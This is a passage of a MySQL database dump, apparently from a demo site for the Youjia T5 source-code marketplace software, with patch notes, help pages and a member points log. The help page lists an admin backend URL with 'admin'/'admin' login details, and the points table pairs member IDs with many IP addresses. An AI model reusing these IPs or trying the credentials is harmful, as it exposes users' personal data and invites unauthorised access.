(8, '1505666356g18', '2017-09-18 00:39:16', 527, '222.242.66.187', '友价商城源码20170917补丁', '<p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">该补丁仅适用于友价商城源码，正版用户请登录后台直接在线升级&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><strong style="margin: 0px auto; padding: 0px;">以下是本次补丁的修复内容：</strong>&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(192, 0, 0);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">1、新增微信扫码登录方式</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">2、美化商家订单详情页面UI展示效果</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">3、订单纠纷新增管理员介入判断机制</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">4、新增注册是否需要手机验证的选项</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">5、删除最大退款数量的设置（已经改为买家可以申请平台介入处理）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">6、新增短信模板ID0(为了便于拓展，以后将统一采用该短信模板)</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">7、改进会员中心卡密的库存管理模块，可以显示使用会员的信息</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">8、商家会员订单列表页，新增订单金额统计</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">9、优化快速登录的弹窗体验</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">10、店铺商品分类功能</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">11、新增店铺内商品搜索功能</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 25px; white-space: normal;">12、更多细节优化完善</p><p><br/></p>', 0, '友价商城源码20170917补丁', '价商城源码20170917补丁'),
(9, '1508326160g90', '2017-10-18 19:29:20', 555, '223.157.248.143', '二开版仿互站网源码最新版友价T5', '<p><span style="color: rgb(51, 51, 51); font-family: 微软雅黑, &#39;microsoft yahei&#39;, &#65533;&#65533;&#65533;&#65533;, Arial, sans-serif; font-weight: bold; line-height: 24px; background-color: rgb(255, 255, 255);">二开版仿互站网源码最新版友价T5&nbsp;</span></p>', 0, '二开版仿互站网源码最新版友价t5', '二开版仿互站网源码最新版友价T5&#160;'),
(10, '1508326205g4', '2017-10-18 19:30:05', 639, '223.157.248.143', '仿Nan源码下载站源码最新版友价t5内核php', '<p><span style="color: rgb(51, 51, 51); font-family: 微软雅黑, &#39;microsoft yahei&#39;, &#65533;&#65533;&#65533;&#65533;, Arial, sans-serif; font-weight: bold; line-height: 24px; background-color: rgb(255, 255, 255);">仿Nan源码下载站源码最新版友价t5内核php</span></p>', 0, '仿nan源码下载站源码最新版友价t5内核php', '仿Nan源码下载站源码最新版友价t5内核php'),
(13, '1559027186g22', '2019-05-27 21:57:26', 566, '223.157.119.254', '系统补丁2019年10月23号', '<p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">该补丁仅适用于源码商城商城源码，正版用户请登录后台直接在线升级&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><strong style="margin: 0px auto; padding: 0px;">以下是本次补丁的修复内容：</strong>&nbsp;</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(192, 0, 0);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(255, 0, 0);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(255, 0, 0);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(255, 0, 0);">手机端：</span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">1、新增一套zhan_m模板(进自助中心下载)</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">2、商品详情页图片没有时，显示默认图片</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">3、优化改进手机版商品详情编辑器</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">4、商品或资讯详情页，修复图片太大时会撑开页面的BUG</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">5、新增公告展示模块</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(255, 0, 0);">电脑端：</span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; font-family: 宋体; color: rgb(8, 8, 8);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">6、QQ点击实现弹窗效果</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">7、设置手机号码强制验证的开关（可实现网络实名制要求）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">8、开通IP黑名单功能（加入黑名单的IP，将禁止操作站内功能）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">9、开启限制功能（比如同个IP注册会员数量，发稿数量之类的）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">10、商品详情页的图片随滚动条滚动加载</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">11、用户解除手机绑定，系统也会将之前的手机号码存档（仅管理员可见）</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">12、手机短信登录时，号码不存在，则直接生成一个会员账号</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">13、优化电脑端商品列表形式展示模板</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;">14、更多细节优化完善<br style="margin: 0px auto; padding: 0px;"/><span style="margin: 0px auto; padding: 0px; font-family: 宋体; color: rgb(8, 8, 8);"></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: &quot;Microsoft YaHei&quot;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(192, 0, 0);"><strong style="margin: 0px auto; padding: 0px;">【附：</strong></span><span style="margin: 0px auto; padding: 0px; text-indent: 2em; color: rgb(192, 0, 0);"><strong style="margin: 0px auto; padding: 0px;">用户朋友在使用过程中有好的建议，欢迎反馈。</strong></span><strong style="margin: 0px auto; padding: 0px; text-indent: 2em; color: rgb(192, 0, 0);">祝您早日实现盈利</strong><strong style="margin: 0px auto; padding: 0px; color: rgb(192, 0, 0);">】</strong></p><p><br/></p>', 0, '商城系统2019年10月23补丁', '该补丁仅适用于商城源码，正版用户请登录后台直接在线升级&#160;以下是本次补丁的修复内容：&#160;手机端：1、新增一套zhan_m模板(进自助中心下载)2、商品详情页图片没有时，显示默认图片3、优化改进手机版商品详情编辑器4、商品或');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_guolv`
--

CREATE TABLE IF NOT EXISTS `yjcode_guolv` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `tit` char(50) DEFAULT NULL,
  `ip1` char(10) DEFAULT NULL,
  `ip2` char(10) DEFAULT NULL,
  `ip3` char(10) DEFAULT NULL,
  `ip4` char(10) DEFAULT NULL,
  `txt` text,
  `sj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `yjcode_guolv`
--

INSERT INTO `yjcode_guolv` (`id`, `bh`, `admin`, `tit`, `ip1`, `ip2`, `ip3`, `ip4`, `txt`, `sj`, `zt`) VALUES
(1, '0507683001559047335', 1, NULL, NULL, NULL, NULL, NULL, NULL, '2019-05-28 20:42:15', 99);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_help`
--

CREATE TABLE IF NOT EXISTS `yjcode_help` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `ty1id` int(11) DEFAULT NULL,
  `ty2id` int(11) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `txt` text,
  `sj` datetime DEFAULT NULL,
  `zt` int(11) DEFAULT NULL,
  `wkey` varchar(250) DEFAULT NULL,
  `wdes` text,
  `djl` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `yjcode_help`
--

INSERT INTO `yjcode_help` (`id`, `bh`, `ty1id`, `ty2id`, `tit`, `txt`, `sj`, `zt`, `wkey`, `wdes`, `djl`) VALUES
(1, '1488540903h15', 13, 0, '本站为友价源码T5网店商城演示站，全站内容采自互联网，仅用于演示作用', '<p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);"><strong style="margin: 0px auto; padding: 0px;">本站为友价源码T5网店商城演示站，全站内容采自互联网，仅用于演示作用</strong></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);"><strong style="margin: 0px auto; padding: 0px;">管理后台：</strong></span><a href="http://www.0598128.com/yjadmin" target="_blank" textvalue="http://www.0598128.com/yjadmin" style="text-decoration: underline; font-size: 18px; color: rgb(255, 0, 0);"><span style="font-size: 18px; color: rgb(255, 0, 0);">http://www.0598128.com/yjadmin</span></a></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);"><strong style="margin: 0px auto; padding: 0px;">演示帐号：admin</strong></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 112, 192);"><strong style="margin: 0px auto; padding: 0px;">演示密码：<strong style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; line-height: 30px; white-space: normal; margin: 0px auto; padding: 0px;">admin</strong></strong></span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;"><br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;">友价网站：<br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;">售前官网：<a href="http://www.928vip.cn" target="_blank">http://www.928vip.cn</a></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;">售后官网：<a href="http://www.yjcode.com/" target="_blank" style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); text-decoration: none;"><a href="http://www.928vip.cn/" target="_blank" style="font-family: Simsun; font-size: 14px; line-height: 30px; white-space: normal;">http://www.928vip.cn</a></a></p><p><br/></p><p><br/></p>', '2017-03-03 19:35:46', 0, '', '', 1);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_helptype`
--

CREATE TABLE IF NOT EXISTS `yjcode_helptype` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `sj` datetime DEFAULT NULL,
  `admin` int(11) DEFAULT NULL,
  `name1` char(50) DEFAULT NULL,
  `name2` char(50) DEFAULT NULL,
  `xh` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=33 ;

--
-- 转存表中的数据 `yjcode_helptype`
--

INSERT INTO `yjcode_helptype` (`id`, `sj`, `admin`, `name1`, `name2`, `xh`) VALUES
(9, '2014-10-15 17:27:48', 1, '买家指南', NULL, 1),
(10, '2014-10-15 17:27:53', 1, '卖家指南', NULL, 2),
(11, '2014-10-15 17:27:58', 1, '安全交易', NULL, 3),
(12, '2014-10-15 17:28:02', 1, '常见问题', NULL, 4),
(13, '2014-10-15 17:28:05', 1, '服务中心', NULL, 5),
(14, '2014-10-15 17:28:28', 2, '买家指南', '如何注册', 1),
(15, '2014-10-15 17:28:33', 2, '买家指南', '如何购买', 2),
(16, '2014-10-15 17:28:37', 2, '买家指南', '搜索商品', 3),
(17, '2014-10-15 17:28:41', 2, '买家指南', '支付方式', 4),
(18, '2014-10-15 17:28:47', 2, '卖家指南', '如何出售', 1),
(19, '2014-10-15 17:28:55', 2, '卖家指南', '收费标准', 2),
(20, '2014-10-15 17:29:02', 2, '卖家指南', '入驻签约', 3),
(21, '2014-10-15 17:29:24', 2, '安全交易', '钓鱼防骗', 1),
(22, '2014-10-15 17:29:31', 2, '安全交易', '预防盗号', 2),
(23, '2014-10-15 17:29:37', 2, '安全交易', '谨防诈骗', 3),
(24, '2014-10-15 17:29:44', 2, '安全交易', '实名认证', 4),
(25, '2014-10-15 17:30:30', 2, '常见问题', '如何充值', 1),
(26, '2014-10-15 17:30:35', 2, '常见问题', '如何提现', 2),
(27, '2014-10-15 17:30:41', 2, '常见问题', '真假客服', 3),
(28, '2014-10-15 17:30:47', 2, '常见问题', '忘记密码', 4),
(29, '2014-10-15 17:30:56', 2, '服务中心', '我要咨询', 1),
(30, '2014-10-15 17:31:01', 2, '服务中心', '我要建议', 2),
(31, '2014-10-15 17:31:12', 2, '服务中心', '我要投诉', 3),
(32, '2014-10-15 17:31:16', 2, '服务中心', 'QQ客服', 4);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_jfrecord`
--

CREATE TABLE IF NOT EXISTS `yjcode_jfrecord` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `jfnum` float DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=1062 ;

--
-- 转存表中的数据 `yjcode_jfrecord`
--

INSERT INTO `yjcode_jfrecord` (`id`, `userid`, `tit`, `jfnum`, `sj`, `uip`) VALUES
(15, 14, '注册会员赠送积分', 1, '2017-03-02 19:51:26', '113.220.166.102'),
(16, 14, '每日签到', 10, '2017-03-03 11:59:06', '223.157.131.226'),
(17, 15, '注册会员赠送积分', 1000, '2017-03-03 20:46:51', '223.157.131.226'),
(18, 15, '每日签到', 10, '2017-03-03 20:57:29', '223.157.131.226'),
(19, 16, '注册会员赠送积分', 10, '2017-03-03 21:36:51', '58.16.197.93'),
(20, 16, '每日签到', 10, '2017-03-04 10:30:42', '58.16.197.93'),
(21, 17, '注册会员赠送积分', 10, '2017-03-05 10:53:25', '183.240.19.229'),
(22, 16, '每日签到', 10, '2017-03-05 15:33:08', '58.16.197.56'),
(23, 18, '注册会员赠送积分', 10, '2017-03-07 19:58:12', '113.220.164.26'),
(24, 19, '注册会员赠送积分', 10, '2017-03-08 20:20:38', '59.40.93.15'),
(25, 20, '注册会员赠送积分', 10, '2017-03-09 12:36:02', '101.206.24.222'),
(26, 21, '注册会员赠送积分', 10, '2017-03-09 15:55:05', '59.42.138.121'),
(27, 22, '注册会员赠送积分', 10, '2017-03-09 17:22:39', '60.222.97.199'),
(28, 23, '注册会员赠送积分', 10, '2017-03-09 19:38:25', '101.226.61.142'),
(29, 24, '注册会员赠送积分', 10, '2017-03-11 15:16:34', '113.67.159.141'),
(30, 25, '注册会员赠送积分', 10, '2017-03-13 21:34:40', '119.250.129.170'),
(31, 26, '注册会员赠送积分', 10, '2017-03-15 17:51:16', '120.239.192.245'),
(32, 14, '交易成功，点评商品获得积分', 10, '2017-03-16 15:22:22', '223.157.155.51'),
(33, 14, '交易成功，点评商品获得积分', 10, '2017-03-16 15:22:42', '223.157.155.51'),
(34, 14, '交易成功，点评商品获得积分', 10, '2017-03-16 16:45:34', '223.157.155.51'),
(35, 27, '注册会员赠送积分', 10, '2017-03-17 16:02:45', '183.240.22.84'),
(36, 28, '注册会员赠送积分', 10, '2017-03-17 19:04:11', '110.82.68.66'),
(37, 29, '注册会员赠送积分', 10, '2017-03-18 00:13:10', '49.84.201.131'),
(38, 30, '注册会员赠送积分', 10, '2017-03-25 22:27:01', '111.73.175.22'),
(39, 30, '每日签到', 10, '2017-03-25 22:38:00', '111.73.175.22'),
(40, 30, '每日签到', 10, '2017-03-26 17:43:40', '111.73.168.171'),
(41, 31, '注册会员赠送积分', 10, '2017-03-28 00:21:14', '120.85.67.108'),
(42, 31, '每日签到', 10, '2017-03-28 00:22:08', '120.85.67.108'),
(43, 14, '每日签到', 10, '2017-03-29 20:32:45', '222.242.68.98'),
(44, 32, '注册会员赠送积分', 10, '2017-03-29 22:02:14', '43.250.200.188'),
(45, 33, '注册会员赠送积分', 10, '2017-03-31 10:30:41', '124.207.28.124'),
(46, 34, '注册会员赠送积分', 10, '2017-03-31 16:31:28', '36.149.218.194'),
(47, 35, '注册会员赠送积分', 10, '2017-04-03 20:20:00', '117.91.162.103'),
(48, 36, '注册会员赠送积分', 10, '2017-04-05 00:11:50', '175.1.72.88'),
(49, 37, '注册会员赠送积分', 10, '2017-04-05 19:34:31', '112.116.113.220'),
(50, 38, '注册会员赠送积分', 10, '2017-04-07 13:13:27', '218.86.154.133'),
(51, 39, '注册会员赠送积分', 10, '2017-04-07 20:21:12', '183.222.131.38'),
(52, 40, '注册会员赠送积分', 10, '2017-04-08 12:36:34', '223.104.90.74'),
(53, 40, '积分兑换金钱', 10, '2017-04-08 20:21:28', '120.192.66.163'),
(54, 41, '注册会员赠送积分', 10, '2017-04-09 11:36:10', '113.88.82.82'),
(55, 41, '交易成功，点评商品获得积分', 10, '2017-05-01 03:56:35', '124.231.162.4'),
(56, 42, '注册会员赠送积分', 10, '2017-05-03 23:03:52', '182.131.125.214'),
(57, 43, '注册会员赠送积分', 10, '2017-05-04 00:53:20', '39.128.40.228'),
(58, 44, '注册会员赠送积分', 10, '2017-05-04 09:23:33', '27.192.37.159'),
(59, 45, '注册会员赠送积分', 10, '2017-05-04 09:25:56', '110.182.204.34'),
(60, 46, '注册会员赠送积分', 10, '2017-05-05 17:53:20', '14.17.37.143'),
(61, 47, '注册会员赠送积分', 10, '2017-05-07 14:36:19', '36.149.71.177'),
(62, 47, '每日签到', 10, '2017-05-07 14:39:07', '36.149.71.177'),
(63, 48, '注册会员赠送积分', 10, '2017-05-07 22:53:48', '118.205.173.84'),
(64, 48, '交易成功，点评商品获得积分', 10, '2017-05-07 23:26:15', '118.205.173.84'),
(65, 49, '注册会员赠送积分', 10, '2017-05-08 07:32:07', '182.241.165.3'),
(66, 49, '每日签到', 10, '2017-05-08 07:33:24', '106.59.107.50'),
(67, 50, '注册会员赠送积分', 10, '2017-05-08 10:40:08', '27.214.234.195'),
(68, 51, '注册会员赠送积分', 10, '2017-05-08 20:20:45', '112.231.38.10'),
(70, 53, '注册会员赠送积分', 10, '2017-05-10 08:33:20', '111.30.81.121'),
(72, 55, '注册会员赠送积分', 10, '2017-05-11 21:29:54', '59.46.38.53'),
(73, 56, '注册会员赠送积分', 10, '2017-05-12 10:07:21', '60.171.240.222'),
(74, 57, '注册会员赠送积分', 10, '2017-05-12 22:00:31', '58.211.2.36'),
(75, 58, '注册会员赠送积分', 10, '2017-05-13 09:45:19', '117.34.13.96'),
(76, 59, '注册会员赠送积分', 10, '2017-05-13 20:56:17', '117.34.13.30'),
(77, 60, '注册会员赠送积分', 10, '2017-05-15 10:14:44', '117.34.13.12'),
(78, 61, '注册会员赠送积分', 10, '2017-05-15 10:23:20', '101.227.207.48'),
(79, 62, '注册会员赠送积分', 10, '2017-05-16 00:36:27', '42.236.93.26'),
(80, 63, '注册会员赠送积分', 10, '2017-05-16 17:10:16', '58.211.2.6'),
(81, 64, '注册会员赠送积分', 10, '2017-05-22 23:25:16', '117.34.13.60'),
(82, 64, '每日签到', 10, '2017-05-22 23:30:00', '117.34.13.60'),
(83, 65, '注册会员赠送积分', 10, '2017-05-23 00:32:35', '116.31.126.101'),
(84, 66, '注册会员赠送积分', 10, '2017-05-27 13:41:35', '115.231.186.36'),
(85, 66, '每日签到', 10, '2017-05-27 13:43:21', '115.231.186.36'),
(86, 67, '注册会员赠送积分', 10, '2017-06-13 12:04:50', '59.51.81.178'),
(87, 68, '注册会员赠送积分', 10, '2017-06-21 11:41:28', '115.231.186.72'),
(88, 69, '注册会员赠送积分', 10, '2017-06-23 05:26:17', '116.31.126.211'),
(89, 70, '注册会员赠送积分', 10, '2017-06-24 23:18:29', '116.31.126.105'),
(90, 67, '每日签到', 10, '2017-06-30 00:26:28', '223.157.220.85'),
(91, 71, '注册会员赠送积分', 10, '2017-06-30 01:23:58', '223.157.220.85'),
(118, 92, '注册会员赠送积分', 10, '2017-08-18 07:17:37', '113.94.55.151'),
(119, 93, '注册会员赠送积分', 10, '2017-08-19 08:29:39', '182.242.169.227'),
(120, 93, '每日签到', 10, '2017-08-19 08:33:14', '182.242.169.227'),
